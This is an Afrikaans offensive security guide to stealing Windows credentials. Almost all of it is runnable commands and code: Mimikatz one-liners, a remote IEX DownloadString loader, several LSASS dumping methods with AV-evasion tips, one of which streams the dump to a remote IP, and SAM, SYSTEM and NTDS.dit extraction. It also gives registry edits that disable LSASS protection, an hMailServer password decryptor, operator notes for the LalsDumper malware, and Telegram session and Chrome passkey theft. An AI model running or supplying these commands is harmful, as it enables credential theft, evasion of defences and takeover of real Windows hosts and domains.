# Steel Windows-aanmeldinligting

{{#include ../../banners/hacktricks-training.md}}

## Aanmeldinligting met Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Vind meer uit oor ander dinge wat Mimikatz kan doen op** [**hierdie bladsy**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Lees hier meer oor moontlike beskermings vir credentials.**](credentials-protections.md) **Hierdie beskermings kan voorkom dat Mimikatz sommige credentials onttrek.**

## Credentials met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **binne die slagoffer na wagwoorde en hashes te soek**.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV omseil

### Procdump + Mimikatz

Omdat **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**’n wettige Microsoft-nutsding is**, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie nutsding gebruik om die **lsass-proses te dump**, **die dump af te laai** en die **geloofsbriewe plaaslik uit die dump te onttrek**.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Hierdie proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Sommige **AV** kan die gebruik van **procdump.exe om lsass.exe te dump** as **kwaadwillig** **opspoor**. Dit is omdat hulle die stringe **"procdump.exe" en "lsass.exe"** **opspoor**. Dit is dus **minder opvallend** om die **PID** van lsass.exe as ’n **argument** aan procdump **deur te gee**, eerder as die **naam lsass.exe**.

### Dumping van lsass met **comsvcs.dll**

’n DLL genaamd **comsvcs.dll**, wat in `C:\Windows\System32` gevind word, is verantwoordelik vir die **dump van prosesgeheue** wanneer ’n ongeluk plaasvind. Hierdie DLL bevat ’n **funksie** genaamd **`MiniDumpW`**, wat ontwerp is om met `rundll32.exe` aangeroep te word.\
Die eerste twee argumente is nie relevant nie, maar die derde een is in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent, die ligging van die dump-lêer die tweede, en die derde komponent moet streng die woord **full** wees. Daar is geen alternatiewe opsies nie.\
Nadat hierdie drie komponente ontleed is, word die DLL gebruik om die dump-lêer te skep en die gespesifiseerde proses se geheue na hierdie lêer oor te dra.\
Dit is moontlik om **comsvcs.dll** te gebruik om die lsass-proses te dump, wat die behoefte uitskakel om procdump op te laai en uit te voer. Hierdie metode word in besonderhede beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Die volgende opdrag word vir uitvoering gebruik:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping van lsass met Task Manager**

1. Regskliek op die taakbalk en klik op Task Manager
2. Klik op Meer besonderhede
3. Soek die proses "Local Security Authority Process" in die Prosesse-oortjie
4. Regskliek op die proses "Local Security Authority Process" en klik op "Skep dump-lêer".

### Dumping van lsass met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is ’n binêre lêer wat deur Microsoft onderteken is en deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-pakket.

’n Bestaande volledige stelselongeluk-dump, of ’n saamgeperste kopie in ’n toeganklike gebruikerslêergids, kan steeds aanmeldbewyse bevat vir vanlyn ontleding. Lêername soos `MEMORY.DMP` en `MEMORY.7z` is slegs leidrade vir ondersoek: verifieer die herkoms en toegang, en moenie aanneem dat dit bruikbare of huidige aanmeldbewyse bevat nie.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is ’n Protected Process Dumper Tool wat die geheuestorting kan obfuskeer en dit na afgeleë werkstasies kan oordra sonder om dit op die skyf te stoor.

**Sleutelfunksies**:

1. Omseiling van PPL-beskerming
2. Obfuskeer van geheuestortingslêers om Defender se handtekeninggebaseerde opsporingsmeganismes te omseil
3. Oplaai van geheuestortings met RAW- en SMB-oplaaimetodes sonder om dit op die skyf te stoor (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-gebaseerde LSASS-dumping sonder MiniDumpWriteDump

Ink Dragon versprei ’n dumper met drie fases, genaamd **LalsDumper**, wat nooit `MiniDumpWriteDump` aanroep nie. EDR-hooks op daardie API word dus nooit geaktiveer nie:<sup>[[3]](#references)</sup>

1. **Fase 1-laaier (`lals.exe`)** – soek in `fdp.dll` na ’n plekhouer wat uit 32 kleinletter-`d`-karakters bestaan, vervang dit met die absolute pad na `rtu.txt`, stoor die aangepaste DLL as `nfdp.dll`, en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die kwaadwillige DLL as ’n nuwe Security Support Provider (SSP) te laai.
2. **Fase 2 binne LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XOR elke greep met `0x20`, en karteer die gedekodeerde blob in geheue voordat uitvoering oorgedra word.
3. **Fase 3-dumper** – die gekarteerde payload implementeer MiniDump-logika opnuut met **direkte syscalls** wat opgelos word uit gehashte API-name (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). ’n Toegewyde uitvoer genaamd `Tom` open `%TEMP%\<pid>.ddt`, skryf ’n saamgeperste LSASS-dump na die lêer en sluit die handvatsel sodat eksfiltrasie later kan plaasvind.

Notas vir die operateur:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll` en `rtu.txt` in dieselfde gids. Fase 1 vervang die hardgekodeerde plekhouer met die absolute pad na `rtu.txt`, dus sal die ketting breek as jy hulle skei.
* Registrasie vind plaas deur `nfdp` by `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` te voeg. Jy kan daardie waarde self vooraf instel sodat LSASS die SSP met elke selflaai herlaai.
* `%TEMP%\*.ddt`-lêers is saamgeperste dumps. Decompress hulle plaaslik en voer hulle dan aan Mimikatz/Volatility vir die onttrekking van geloofsbriewe.
* Om `lals.exe` uit te voer, is admin-/SeTcb-regte nodig sodat `AddSecurityPackageA` slaag. Sodra die aanroep terugkeer, laai LSASS die skelm SSP deursigtig en voer Fase 2 uit.
* As jy die DLL van die skyf verwyder, word dit nie uit LSASS verwyder nie. Verwyder óf die registerinskrywing en herbegin LSASS (herlaai die stelsel), óf laat dit daar vir langtermyn-persistensie.

## CrackMapExec

### Dump SAM-hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA-geheime

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump die NTDS.dit vanaf die teiken-DC

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump die wagwoordgeskiedenis van NTDS.dit vanaf die teiken-DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Wys die pwdLastSet-kenmerk vir elke NTDS.dit-rekening

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEM steel

Hierdie lêers behoort in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM_ **te wees**. Maar **jy kan hulle nie sommer op ’n gewone manier kopieer nie**, want hulle is beskerm.

### Van die register

Die maklikste manier om hierdie lêers te steel, is om ’n kopie uit die register te kry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Laai** daardie lêers na jou Kali-masjien **af** en **onttrek die hashes** met behulp van:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Jy kan beskermde lêers kopieer deur hierdie diens te gebruik. Jy moet 'n Administrateur wees.

#### Gebruik van vssadmin

Die vssadmin-binêre lêer is slegs beskikbaar in Windows Server-weergawes

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Maar jy kan dieselfde vanaf **Powershell** doen. Dit is ’n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word, is "C:" en dit word in C:\users\Public gestoor), maar jy kan dit gebruik om enige beskermde lêer te kopieer:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory-aanmeldbewyse - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory** en bevat belangrike data oor gebruikerobjekte, groepe en hul lidmaatskappe. Dit is waar die **password hashes** vir domeingebruikers gestoor word. Hierdie lêer is ’n **Extensible Storage Engine (ESE)**-databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.

Drie primêre tabelle word in hierdie databasis onderhou:

- **Data Table**: Hierdie tabel stoor besonderhede oor objekte soos gebruikers en groepe.
- **Link Table**: Dit hou verhoudings, soos groeplidmaatskappe, na.
- **SD Table**: **Security descriptors** vir elke objek word hier gehou om die sekuriteit en toegangsbeheer vir die gestoorde objekte te verseker.

Christoffer Andersson se navorsing op databasisvlak dokumenteer hierdie tabelle en hul weergawe-spesifieke gedrag in meer besonderhede.<sup>[[8]](#references)</sup>

Windows gebruik _Ntdsa.dll_ om met hierdie lêer te werk, en dit word deur _lsass.exe_ gebruik. Daarna kan **’n deel** van die **NTDS.dit**-lêer **binne die `lsass`**-geheue geleë wees (jy kan waarskynlik die data wat die laaste keer verkry is daar vind weens die werkverrigtingverbetering wat deur ’n **cache** verkry word).

#### Decrypting the hashes inside NTDS.dit

Die hash word drie keer geënkripteer:

1. De-enkripteer die Password Encryption Key (**PEK**) met die **BOOTKEY** en **RC4**.
2. De-enkripteer die **hash** met die **PEK** en **RC4**.
3. De-enkripteer die **hash** met **DES**.

Die **PEK** het dieselfde waarde op elke domeinbeheerder, maar dit is binne **NTDS.dit** geënkripteer met daardie domeinbeheerder se eie **BOOTKEY** uit sy **SYSTEM**-hive. Daarom vereis die onttrekking van aanmeldbewyse beide **NTDS.dit** en **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kopieer NTDS.dit met Ntdsutil

Beskikbaar sedert Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system)-truuk gebruik om die **ntds.dit**-lêer te kopieer. Onthou dat jy ook ’n kopie van die **SYSTEM-lêer** nodig het (gebruik weer die truuk om dit [**uit die register te dump of die volume shadow copy te gebruik**](#stealing-sam-and-system)).

### **Hashes uit NTDS.dit onttrek**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** **verkry** het, kan jy nutsgoed soos _secretsdump.py_ gebruik om die **hashes te onttrek**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Jy kan hulle ook **outomaties onttrek** met ’n geldige domeinadministrateurrekening:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Vir **groot NTDS.dit-lêers** word dit aanbeveel om dit met [gosecretsdump](https://github.com/c-sto/gosecretsdump) te onttrek.

Laastens kan jy ook die **metasploit-module** gebruik: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Onttrekking van domeinobjekte uit NTDS.dit na ’n SQLite-databasis**

NTDS-objekte kan met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) na ’n SQLite-databasis onttrek word. Nie net geheime word onttrek nie, maar ook die volledige objekte en hul eienskappe, sodat verdere inligting onttrek kan word wanneer die rou NTDS.dit-lêer reeds verkry is.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Die `SYSTEM`-hive is opsioneel, maar maak dekripsie van geheime moontlik (NT- en LM-hashes, aanvullende geloofsbriewe soos duideliktekswagwoorde, Kerberos- of trust-sleutels, NT- en LM-wagwoordgeskiedenisse). Saam met ander inligting word die volgende data onttrek: gebruiker- en masjienrekeninge met hul hashes, UAC-vlae, tydstempel van laaste aanmelding en wagwoordverandering, rekeningbeskrywings, name, UPN, SPN, groepe en rekursiewe lidmaatskappe, organisasie-eenhede se boomstruktuur en lidmaatskappe, vertroude domeine met trusttipes, rigting en eienskappe...

## Lazagne

Laai die binêre lêer [hier](https://github.com/AlessandroZ/LaZagne/releases) af. Jy kan hierdie binêre lêer gebruik om geloofsbriewe uit verskeie sagteware te onttrek.

```
lazagne.exe all
```

## Ander nutsmiddels om geloofsbriewe uit SAM en LSASS te onttrek

### Windows credentials Editor (WCE)

Hierdie nutsmiddel kan gebruik word om geloofsbriewe uit die geheue te onttrek. Laai dit af vanaf: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek geloofsbriewe uit die SAM-lêer

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Onttrek aanmeldbewyse uit die SAM-lêer

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Laai dit af vanaf:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) en **voer dit uit** om die wagwoorde te onttrek.

## Ontginning van onaktiewe RDP-sessies en verswakking van sekuriteitskontroles

Ink Dragon se FinalDraft RAT sluit ’n `DumpRDPHistory`-tasker in waarvan die tegnieke nuttig is vir enige red-teamer:<sup>[[3]](#references)</sup>

### Telemetrieversameling in die styl van DumpRDPHistory

* **Uitgaande RDP-teikens** – ontleed elke gebruikershive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke subsleutel stoor die bedienernaam, `UsernameHint` en die tydstempel van die laaste skryfbewerking. Jy kan FinalDraft se logika met PowerShell naboots:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Bewyse van inkomende RDP** – raadpleeg die `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational`-logboek vir Gebeurtenis-ID's **21** (suksesvolle aanmelding) en **25** (ontkoppeling) om vas te stel wie die masjien geadministreer het:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (met LalsDumper/Mimikatz) terwyl hul **ontkoppelde** sessie steeds bestaan. CredSSP + NTLM-fallback laat hul verifier en tokens in LSASS agter, wat dan oor SMB/WinRM herhaal kan word om `NTDS.dit` te bekom of volharding op domeinbeheerders te bewerkstellig.

### Registerafgraderings wat deur FinalDraft geteiken word

Dieselfde implant peuter ook met verskeie registersleutels om diefstal van geloofsbriewe makliker te maak:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` deaktiveer Restricted Admin vir inkomende RDP; dit aktiveer **nie** pass-the-hash deur daardie modus nie. Deur die waarde op `0` te stel, word Restricted Admin op die bestemming toegelaat, maar die kliënt moet `/RestrictedAdmin` aanvra of ’n beleid gebruik wat Restricted Admin vereis.<sup>[[14]](#references)</sup> ’n Hash alleen verleen nie afstandadministrateurregte nie; sien [RDP-verifikasievereistes](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` deaktiveer UAC-tokenfiltrering sodat plaaslike admins onbeperkte tokens oor die netwerk kry.
* `DSRMAdminLogonBehavior=2` laat die DSRM-administrateur aanmeld terwyl die DC aanlyn is, wat aanvallers nog ’n ingeboude rekening met hoë voorregte gee.
* `RunAsPPL=0` verwyder LSASS PPL-beskerming, wat geheuetoegang vir dumpers soos LalsDumper eenvoudig maak.

## hMailServer-konfigurasie-aanmeldbesonderhede (ná kompromittering)

Gaan die presiese konfigurasielêers `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` en `C:\ProgramData\hMailServer\hMailServer.ini` na, volgens die installasie-uitleg. ’n Leesbare, nie-leë `[Security] AdministratorPassword=`-waarde is ’n hMailServer-administrasiewagwoordhash; dit is nie bewys van ’n Windows Administrator-wagwoord nie. Indien daardie aanmeldbesonderheid herwin word, vereis enige sprong na ’n Windows-rekening dat hergebruik van die wagwoord en aanmeldregte onafhanklik geverifieer word.

Vir installasies wat ’n SQL CE-databasis gebruik, beskerm die afsonderlike `[Database] Password=`-waarde in die INI die databasis. In verouderde installasies is hierdie waarde Blowfish-geënkripteer met die statiese sleutel `THIS_KEY_IS_NOT_SECRET` en 4-greep-woord-endianness-omruilings. Gebruik die heksadesimale string uit die INI met hierdie Python-brokkie:<sup>[[2]](#references)</sup>

Bevestig eers dat die huidige rekening **beide** die INI en die ooreenstemmende SQL CE-`.sdf`-databasis kan lees. Die INI-wagwoord beskerm die databasis; dit is apart van die posbusrekeninghashes wat daarin gestoor word. Ondersoek of gradeer ’n **kopie** van ’n databasis wat in gebruik is op; moet nooit die lewendige lêer gebruik nie.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Met die clear-text password, kopieer die SQL CE-databasis om lêerslotte te vermy, laai die 32-bit provider en gradeer op indien nodig voordat jy na hashes soek:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Die `accountpassword`-kolom gebruik die hMailServer-hashformaat (hashcat-modus `1421`). ’n Gekraakte posbuswagwoord word slegs ’n Windows-gebruikerspivot as ’n plaaslike/domeinrekening dieselfde wagwoord gebruik en daardie rekening die vereiste regte vir afstandaanmelding het.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Sommige gereedskap vang **plaintext-aanmeldwagwoorde** vas deur die LSA-aanmeldterugroeping `LsaApLogonUserEx2` te onderskep. Die idee is om die terugroeping van die verifikasiepakket te hook of toe te vou, sodat eiebewyse **tydens aanmelding** (voor hashing) vasgevang en dan op skyf gestoor of aan die operateur teruggestuur word. Dit word gewoonlik geïmplementeer as ’n helper wat in LSA inject of daarmee registreer, en dan elke suksesvolle interaktiewe/netwerk-aanmeldgebeurtenis met die gebruikersnaam, domein en wagwoord aanteken.<sup>[[1]](#references)</sup>

Operasionele notas:
- Vereis plaaslike admin/SYSTEM om die helper in die verifikasiepad te laai.
- Vasgevangde eiebewyse verskyn slegs wanneer ’n aanmelding plaasvind (interaktief, RDP, diens- of netwerk-aanmelding, afhangend van die hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stoor gestoorde verbindinginligting in ’n `sqlstudio.bin`-lêer per gebruiker. Toegewyde dumpers kan die lêer ontleed en gestoorde SQL-eiebewyse herwin. In shells wat slegs opdraguitvoer teruggee, word die lêer dikwels deur dit as Base64 te enkodeer en na stdout uit te druk, uitgevoer.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Aan die operateur se kant, herbou die lêer en voer die dumper plaaslik uit om aanmeldbesonderhede te herwin:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Blaaier-sessie- en cookie-diefstal via Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Diefstal van Telegram Desktop `tdata`-sessies

Telegram Desktop hou magtigings- en rekeningtoestand in sy **`tdata`**-gids. ’n Gekopieerde sessie kan met versoenbare nutsmiddels gelaai word om te staaf sonder die rekeningwagwoord, solank daardie magtiging geldig bly; as plaaslike-data-enkripsie geaktiveer is, het die stealer ook die wagwoordkode nodig. ’n Gestaafde sessie kan dan identiteitsdata, gesprek- en lidmaatskapmetadata, boodskappe en aflaaibare media blootlê.<sup>[[10]](#references)</sup>

### Ontdekking en verkryging

Soek in beide geïnstalleerde en draagbare uitlegte; Microsoft Store-pakketname verskil, dus lys pakketgidse wat `TelegramMessenge` bevat en ondersoek hul `LocalCache\Roaming`-subgids.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

As gewone leesbewerkings misluk en die proses-token reeds `SeBackupPrivilege` bevat en geaktiveer het, bied backup-bewuste toegang ’n terugvalopsie; dit verkry nie die privilegie of verhoog die proses se regte nie. `CreateFileW` met `FILE_FLAG_BACKUP_SEMANTICS` kan backup-/restore-semantiek aanvra en lêersekuriteitskontroles omseil wanneer die vereiste token-privilegies teenwoordig is, maar die vlag alleen omseil nie ’n onversoenbare deel-slot nie.<sup>[[10]](#references)[[11]](#references)</sup>

Skep/lees ’n **Volume Shadow Copy** vir lêers wat tans gesluit is; vir lêers wat deur ACL’s geblokkeer word, gebruik `robocopy /B` backup-modus om lêer- en gids-ACL’s te omseil.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

’n Bandwydtebewuste implant kan eers net die lêerpadinventaris indien, ’n momentopname-identifiseerder plus die paaie wat reeds deur die C2 gestoor is ontvang, en net ontbrekende lêers oplaai. Daarom kan klein inkrementele oordragte ná rekursiewe `tdata`-enumerasie steeds op suksesvolle sessiediefstal dui.<sup>[[10]](#references)</sup>

### Opsporing en indamming

Korrelleer rekursiewe toegang tot `tdata` deur ’n nie-Telegram-proses met die aktivering van `SeBackupPrivilege`, lêeropenings met backup-semantics, VSS-aktiwiteit, of ’n kindproses `robocopy.exe` wat `/B` gebruik. Soek ook na vinnige enumerasie van beide `%APPDATA%` en `%LOCALAPPDATA%\Packages`, gevolg deur uitgaande verbindings vanaf dieselfde proses. Gebruik ná ’n kompromittering **Settings → Devices** (of **Privacy & Security → Active Sessions**) om onbekende sessies te beëindig; die aktivering van tweestapverifikasie alleen herroep nie ’n magtiging wat reeds gesteel is nie.<sup>[[10]](#references)[[13]](#references)</sup>

## Diefstal van Passkeys / WebAuthn-aanmeldbewyse vanaf Chrome op Windows

As kode-uitvoering as die **slagoffer gebruiker** verkry word op ’n Windows-gasheer wat **Chrome + Google Password Manager-gesinkroniseerde passkeys** gebruik, word passkeys ’n interessante post-exploitation-teiken, selfs **sonder admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante plaaslike artefakte

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** stoor protobuf-geënkodeerde **`WebauthnCredentialSpecifics`**-rekords. ’n Proses onder dieselfde gebruiker kan die **RP ID**, **gebruikersnaam**, **credential ID** en geënkripteerde private-sleutelmateriaal vir gesinkroniseerde passkeys lys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** stoor plaaslike toestelinskrywingstoestand, soos **`wrapped_identity_private_key`** en die omhulde geheim wat gebruik word om gesinkroniseerde credentials te herstel.<sup>[[4]](#references)</sup>

Vinnige triage:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-gebonde sleutelblobs kan steeds as ’n plaaslike ondertekeningsoracle misbruik word

As die blaaier ’n TPM-gesteunde identiteitsleutel as **`NCRYPT_OPAQUE_KEY_BLOB`** uitvoer en daardie blob in ’n gebruikerstoeganklike toestand stoor, hoef malware **nie** die rou private sleutel te onttrek nie. Dit kan die blob eenvoudig op **dieselfde masjien** herinvoer en die plaaslike TPM vra om aanvallerbeheerde data te onderteken:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
